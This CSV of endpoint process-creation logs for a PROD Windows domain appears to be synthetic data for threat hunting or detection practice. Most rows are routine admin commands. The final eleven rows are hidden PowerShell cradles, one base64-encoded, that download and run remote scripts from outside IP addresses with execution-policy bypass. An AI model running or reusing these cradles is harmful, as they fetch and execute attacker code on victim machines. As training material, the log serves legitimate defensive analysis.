Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,ProcessCommandLine,ProcessId,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-02-19T09:30:20.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Connect-ExchangeOnline -UserPrincipalName admin@prod.corp.local""",34385,explorer.exe,34552,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,60b13e33c41ecaac06c6987301fb69ff
2026-02-14T08:37:58.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Mailbox -ResultSize Unlimited""",34643,explorer.exe,34714,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,ae40bcd9bf4dcd3db9647434f7497b12
2026-02-25T11:24:33.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""New-PSSession -ComputerName appserver.prod.corp.local""",34826,explorer.exe,34842,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,6bad7c82254e79ce67a8edd180f855c4
2026-02-17T08:25:42.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c icacls C:\Shared /grant Everyone:R,34926,explorer.exe,35150,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,613236f405aa6f226c7685a621f45181
2026-02-06T08:47:03.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c takeown /f C:\Logs /r,35276,explorer.exe,35415,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,fce3c1392a0396349c259f08f438bd4a
2026-02-24T08:15:34.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-WmiObject -Class Win32_BIOS""",35537,explorer.exe,35618,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,d9b04579a3fc8dbce26c26a39a0a1ebe
2026-02-13T11:52:46.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-WmiObject -Class Win32_NetworkAdapterConfiguration""",35686,explorer.exe,35889,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,24f93973e083d62e8af3b40f255e245b
2026-02-19T21:16:32.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-PSDrive""",41102,explorer.exe,54651,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,a532b8c148a001255154ba244ab4c914
2026-02-25T17:37:10.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Command -Module ActiveDirectory""",23619,explorer.exe,29433,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,411b7c9f819eb3792f807e02ce8b94ba
2026-02-05T23:01:54.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-NetIPAddress -AddressFamily IPv4""",27042,explorer.exe,21067,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,d22654ac142b575962917ea95667eb6b
2026-02-16T21:58:22.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-WindowsUpdateLog""",24705,explorer.exe,33072,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,8fe87f70bdfad9bf14ff1797fd0bf421
2026-02-14T00:52:13.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Acl C:\Windows\System32""",55030,explorer.exe,29581,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,983d859fcf683607172a48b550066227
2026-02-12T19:37:15.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Set-Service -Name Spooler -StartupType Automatic""",22824,explorer.exe,60873,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,c1d528ce7c193667f493570032ca9789
2026-02-10T00:25:38.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Counter -Counter '\Processor(_Total)\% Processor Time'""",43894,explorer.exe,35547,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,454070685e6377d28333826dec655f6b
2026-02-25T21:16:39.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c query user,44707,explorer.exe,8879,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,1cd5e88fcac51230103b8329a985f91a
2026-02-03T18:15:43.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c logman query,6492,explorer.exe,5291,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,6af68dd7c609ac9a0006dd986c4e7d1a
2026-02-06T00:19:37.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c diskpart /s C:\scripts\diskpart.txt,8914,explorer.exe,25586,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,6572a5f9d119ffa1be768126b56e762d
2026-02-24T22:20:12.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c netsh wlan show profiles,8321,explorer.exe,5728,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,e18a1850a326104f559ad50d60990964
2026-02-23T17:02:18.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c wmic bios get serialnumber,21412,explorer.exe,18117,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,f92201455c48f093dc61a119fb6722ed
2026-02-03T23:53:33.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Package -Name 'Microsoft Visual C++*'""",15866,explorer.exe,10046,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,0d224fa5a40d50e45d13dc4b09e97fda
2026-02-04T00:31:45.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Uninstall-Package -Name 'OldApp' -Force""",30336,explorer.exe,24135,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,c2697e69cce955e1b188042808332488
2026-02-14T17:59:08.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Module -ListAvailable""",13374,explorer.exe,16441,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,dcaeb121cc4985a3c66cbf56570bc3cc
2026-02-04T18:18:45.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Update-Module -Name Az -Force""",12357,explorer.exe,39568,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,9df0d2564a2d5c1d012f44a7a89507f0
2026-02-18T23:15:57.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,"cmd.exe /c net start ""Windows Update""",34687,explorer.exe,57974,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,3af4ed448d9cba93e9128fdf230e3f13
2026-02-10T18:10:40.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,"cmd.exe /c net stop ""Print Spooler""",19662,explorer.exe,33564,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,e9826b1f4bc06b02403d4f2931d6084f
2026-02-01T23:22:22.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-EventSubscriber""",31412,explorer.exe,23482,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,e27bb60303a39117624be25790113c81
2026-02-01T22:07:03.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""iex(iwr https://212.193.30.21/rd2)""",21814,explorer.exe,20010,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,b3433d9618bcb7c7cca501d353073146
2026-02-02T22:59:46.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -ep bypass -w hidden -c ""irm https://45.141.87.30/rd3 | iex""",17179,explorer.exe,58762,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,c9dd9ec4d4defc8550fa8a59bdf9dcd2
2026-02-03T16:45:44.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,powershell.exe -WindowStyle Hidden -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwA3ADcALgA5ADEALgA2ADgALgAyADAALwByAGQANAApAA==,60019,explorer.exe,32752,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,dac183d0753d1a3d40ff1d43baccde4d
2026-02-04T17:52:57.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://179.43.167.55/rd5')""",39157,explorer.exe,42731,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,6e05a5f54c09d4cd9fa8de1873b81e31
2026-02-06T01:27:21.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -nop -w hidden -ep bypass -c ""IEX(irm https://212.193.30.21/rd6)""",30302,explorer.exe,38704,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,cb5f69bfacb06aca5a74be3e456c8dc8
2026-02-07T01:45:52.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NonInteractive -c ""iex(iwr -UseBasicParsing https://45.141.87.30/rd7)""",18212,explorer.exe,51621,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,9a125acc76feee612ac014ee3b9bf040
2026-02-08T01:56:02.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -ep bypass -c ""IEX(iwr https://77.91.68.20/rd8 -UseBasicParsing)""",33731,explorer.exe,30371,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,45f6884a40e00aa156a969cafec16cc8
2026-02-08T18:48:13.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""irm https://179.43.167.55/rd9 | iex""",8307,explorer.exe,30679,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,d1410d828dcf29be1c0f12a516b70dfa
2026-02-10T01:43:56.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -WindowStyle Hidden -c ""iex(iwr https://212.193.30.21/rd10)""",10739,explorer.exe,59787,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,3c5fd12d1b53268c2e02a5ce83102fe3
2026-02-10T20:52:03.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -nop -ep bypass -w hidden -c ""IEX(irm https://77.91.68.20/rd11)""",50022,explorer.exe,50792,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,32e11750bee613f1d3c62e6146830e44
